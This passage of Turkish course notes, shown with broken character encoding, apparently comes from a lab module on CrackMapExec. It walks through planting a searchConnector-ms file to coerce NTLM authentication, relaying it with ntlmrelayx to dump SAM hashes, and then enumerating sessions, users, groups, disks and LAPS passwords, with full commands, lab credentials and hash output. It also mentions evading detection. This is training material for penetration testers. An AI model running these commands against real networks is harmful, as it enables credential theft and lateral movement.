Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

```
crackmapexec smb -M drop-sc --options

[*] drop-sc module options:
 Technique discovered by @DTMSecurity and @domchell to remotely
coerce a host to start WebClient service.
 https://dtm.uk/exploring-search-connectors-and-library-fileson-windows/
 Module by @zblurx
 URL URL in the searchConnector-ms file, default
https://rickroll
 CLEANUP Cleanup (choices: True or False)
 SHARE Specify a share to target
 FILENAME Specify the filename used WITHOUT the extension
searchConnector-ms (it's automatically added); the default is "Documents".
```

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DROP-SC 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
DROP-SC 172.16.1.10 445 DC01 [+] Created
secret.searchConnector-ms file on the IT-Tools share
```

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry

```

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DROP-SC 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
DROP-SC 172.16.1.10 445 DC01 [+] Deleted
secret.searchConnector-ms file on the IT-Tools share

```


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated
loggedon users
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio
logon_server: DC01
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\DC01$
SMB 10.129.203.121 445 DC01
INLANEFREIGHT\svc_workstations logon_server: DC01
```

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers --loggedon-users-filter julio

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Enumerated loggedon users
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio logon_server: DC01
```

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --computers

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain computer(s)
SMB 10.129.203.121 445 DC01 inlanefreight.htb\MS01$
SMB 10.129.203.121 445 DC01 inlanefreight.htb\DC01$

```


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


```
(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec idap poudlard.wizard tom=October2021 -W laps
192.168.133.148 445 poudlard.wizard [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:poudlard.wizard) (signing:True) (SMBv1:LDAP)
192.168.133.148 389 poudlard.wizard [*] poudlard.wizard\tom:October2021
192.168.133.148 389 DC01 [*] Getting LAPS Passwords
192.168.133.148 389 DC01 Computer: DC015 Password: DW/9[pl65M0090
192.168.133.148 389 DC01 Computer: ADCS5 Password: A3)[qoAC56Hf5t
192.168.133.148 389 DC01 Computer: SOL015 Password: k9nzH6cBeFBv1-]


(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps
192.168.133.138 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
192.168.133.138 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
192.168.133.138 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)


(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps -SAM
192.168.133.147 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
192.168.133.148 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)
192.168.133.148 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
192.168.133.147 445 192.168.133.167 [*] Dumping SAM hashes
192.168.133.147 445 192.168.133.167 Administrator:500:aad3b435b51404eeaad3b435b51404ee:459d09c80f5cdb8cbcfc2e937b4aa84:::
192.168.133.147 445 192.168.133.167 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.147 445 192.168.133.167 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.147 445 192.168.133.167 [*] Added 7 SAM hashes to the database
192.168.133.148 445 192.168.133.138 [*] Dumping SAM hashes
192.168.133.148 445 192.168.133.138 Administrator:500:aad3b435b51404eeaad3b435b51404ee:24cf58cdd659d17a0e2e24457b531c:::
192.168.133.148 445 192.168.133.138 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.148 445 192.168.133.138 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.148 445 192.168.133.138 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cdde631ea957359bbc5fe18d942318ca:::
192.168.133.148 445 192.168.133.138 Toto:1000:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d813e12497fb5e51:::
192.168.133.148 445 192.168.133.138 Test:1001:aad3b435b51404eeaad3b435b51404ee:0210e4a570d22539c0bc588587d2a76e1:::
192.168.133.148 445 192.168.133.138 adminLocal:1002:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d81236f249fb3c51:::
192.168.133.148 445 192.168.133.138 [*] Added 7 SAM hashes to the database
```

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --rid-brute

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Brute forcing RIDs
SMB 10.129.203.121 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 500:
INLANEFREIGHT\Aministrator (SidTypeUser)
SMB 10.129.203.121 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.203.121 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.203.121 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
SMB 10.129.203.121 445 DC01 514:
INLANEFREIGHT\Domain Guests (SidTypeGroup)
SMB 10.129.203.121 445 DC01 515:
INLANEFREIGHT\Domain Computers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 516:
INLANEFREIGHT\Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 517:
INLANEFREIGHT\Cert Publishers (SidTypeAlias)
SMB 10.129.203.121 445 DC01 518:
INLANEFREIGHT\Schema Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 519:
INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 520:
INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
SMB 10.129.203.121 445 DC01 521:
INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 522:
INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 525:
INLANEFREIGHT\Protected Users (SidTypeGroup)
SMB 10.129.203.121 445 DC01 526: INLANEFREIGHT\Key
Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 527:
INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 553: INLANEFREIGHT\RAS
and IAS Servers (SidTypeAlias)
SMB 10.129.203.121 445 DC01 571:
INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB 10.129.203.121 445 DC01 572:
INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
SMB 10.129.203.121 445 DC01 1002:
INLANEFREIGHT\DC01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 1103:
INLANEFREIGHT\DnsAdmins (SidTypeAlias)
SMB 10.129.203.121 445 DC01 1104:
INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)
SMB 10.129.203.121 445 DC01 1106:
INLANEFREIGHT\julio (SidTypeUser)
SMB 10.129.203.121 445 DC01 1107:
INLANEFREIGHT\david (SidTypeUser)
SMB 10.129.203.121 445 DC01 1108:
INLANEFREIGHT\john (SidTypeUser)
SMB 10.129.203.121 445 DC01 1109:
INLANEFREIGHT\svc_workstations (SidTypeUser)
SMB 10.129.203.121 445 DC01 2107: INLANEFREIGHT\MS01$ (SidTypeUser) SMB 10.129.203.121 445 DC01 2606: INLANEFREIGHT\carlos (SidTypeUser) SMB 10.129.203.121 445 DC01 2607: INLANEFREIGHT\robert (SidTypeUser) SMB 10.129.203.121 445 DC01 2608: INLANEFREIGHT\Linux Admins (SidTypeGroup) SMB 10.129.203.121 445 DC01 2609: INLANEFREIGHT\LINUX01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 2107:
INLANEFREIGHT\MS01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 2606:
INLANEFREIGHT\carlos (SidTypeUser)
SMB 10.129.203.121 445 DC01 2607:
INLANEFREIGHT\robert (SidTypeUser)
SMB 10.129.203.121 445 DC01 2608:
INLANEFREIGHT\Linux Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 2609:
INLANEFREIGHT\LINUX01$ (SidTypeUser)

```

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --disks

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated disks
SMB 10.129.203.121 445 DC01 C:
SMB 10.129.203.121 445 DC01 D:

```


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --localgroups
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated local
groups
SMB 10.129.203.121 445 DC01 Cert Publishers
membercount: 0
SMB 10.129.203.121 445 DC01 RAS and IAS Servers
membercount: 0
SMB 10.129.203.121 445 DC01 Allowed RODC Password
Replication Group membercount: 0
SMB 10.129.203.121 445 DC01 Denied RODC Password
Replication Group membercount: 8
SMB 10.129.203.121 445 DC01 DnsAdmins
membercount: 0
SMB 10.129.203.121 445 DC01
SQLServer2005SQLBrowserUser$DC01 membercount: 0
SMB 10.129.203.121 445 DC01 Server Operators
membercount: 5
<SNIP>
SMB 10.129.203.121 445 DC01 Remote Management
Users membercount: 3
SMB 10.129.203.121 445 DC01 Storage Replica
Administrators membercount: 0
```

### Enumerating Domain Groups

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
group(s)
SMB 10.129.203.121 445 DC01 LAPS_PCAdmin
membercount: 1
SMB 10.129.203.121 445 DC01 LAPS_DCAdmin
membercount: 0
SMB 10.129.203.121 445 DC01
SQLServer2005SQLBrowserUser$DC01 membercount: 0
SMB 10.129.203.121 445 DC01 Help Desk 2
membercount: 0
SMB 10.129.203.121 445 DC01 Help Desk
membercount: 0
SMB 10.129.203.121 445 DC01 Linux Admins
membercount: 3
<SNIP>
SMB 10.129.203.121 445 DC01 Guests
membercount: 2
SMB 10.129.203.121 445 DC01 Users
membercount: 3
SMB 10.129.203.121 445 DC01 Administrators
membercount: 5

```


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups
Administrators

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated members
of domain group
SMB 10.129.203.121 445 DC01 inlanefreight.htb\htb
SMB 10.129.203.121 445 DC01
inlanefreight.htb\plaintext
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Domain Admins
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Enterprise Admins
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Administrator
```

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
